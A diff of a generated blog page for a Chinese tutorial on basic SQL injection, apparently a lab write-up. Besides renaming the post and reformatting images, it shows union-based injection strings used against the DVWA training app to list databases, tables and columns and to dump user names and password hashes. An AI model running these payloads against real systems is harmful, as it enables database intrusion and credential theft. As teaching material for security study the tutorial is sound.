@@ -232,7 +232,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/06/sql注入基础/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/06/简单sql注入过程/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="忖度">
@@ -251,7 +251,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/07/06/sql注入基础/" itemprop="url">sql注入基础</a></h1>
+                <a class="post-title-link" href="/2018/07/06/简单sql注入过程/" itemprop="url">简单sql注入过程</a></h1>
         
 
         <div class="post-meta">
@@ -303,14 +303,13 @@
       
         
           
-            <p>原理就不说了，介绍对于最简单的sql注入，单引号型且无过滤，如何注入</p>
+            <p>原理就不说了，介绍最简单的sql注入的一般过程，单引号型且无过滤</p>
 <h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><ul>
 <li>user()：返回数据库的用户名</li>
 <li>database()：返回当前用的数据库名</li>
 <li>version()：返回数据库版本</li>
 <li>union()：连接多个select结果，要求每个语句有相等的列，列类型、顺序相等</li>
 <li>concat_ws()：将一行结果中的多列连接起来，第一个参数为连接分割符，后面参数为要查询的东西</li>
-<li>group_concat()：将多行结果连接起来，注入时，该作用可以用limit来代替</li>
 </ul>
 <h1 id="mysql通用数据库"><a href="#mysql通用数据库" class="headerlink" title="mysql通用数据库"></a>mysql通用数据库</h1><p>每个mysql都有一个通用数据库：information_schema，其中有几个重要的表：</p>
 <ul>
@@ -355,13 +354,17 @@
 <li><p>注入：</p>
 <ul>
 <li><p>查看所用库： <code>&#39; union select 1,database()#</code> </p>
-<pre><code>![](https://i.imgur.com/kR2CYY5.png)
-</code></pre></li>
-<li><p>查看该库中的所有表： <code>&#39; union select 1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = &#39;dvwa&#39; #</code><br><img src="https://i.imgur.com/Oo1bHBA.png" alt=""></p>
+<p><img src="https://i.imgur.com/kR2CYY5.png" alt=""></p>
 </li>
-<li><p>查看users表中有哪些列： <code>&#39; union select 1,COLUMN_NAME from information_schema.COLUMNS where  TABLE_SCHEMA = &#39;dvwa&#39; and TABLE_NAME = &#39;users&#39; #</code><br><img src="https://i.imgur.com/5QwxXg7.png" alt=""></p>
+<li><p>查看该库中的所有表： <code>&#39; union select 1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = &#39;dvwa&#39; #</code></p>
+<p><img src="https://i.imgur.com/Oo1bHBA.png" alt=""></p>
 </li>
-<li>dump:    <code>&#39; union select 1,concat_ws(&#39; - &#39;,user_id,first_name,last_name,user,password) from users #</code><br><img src="https://i.imgur.com/MtbNVPP.png" alt=""></li>
+<li><p>查看users表中有哪些列： <code>&#39; union select 1,COLUMN_NAME from information_schema.COLUMNS where  TABLE_SCHEMA = &#39;dvwa&#39; and TABLE_NAME = &#39;users&#39; #</code></p>
+<p><img src="https://i.imgur.com/5QwxXg7.png" alt=""></p>
+</li>
+<li><p>dump:    <code>&#39; union select 1,concat_ws(&#39; - &#39;,user_id,first_name,last_name,user,password) from users #</code></p>
+<p><img src="https://i.imgur.com/MtbNVPP.png" alt=""></p>
+</li>
 </ul>
 </li>
 </ol>
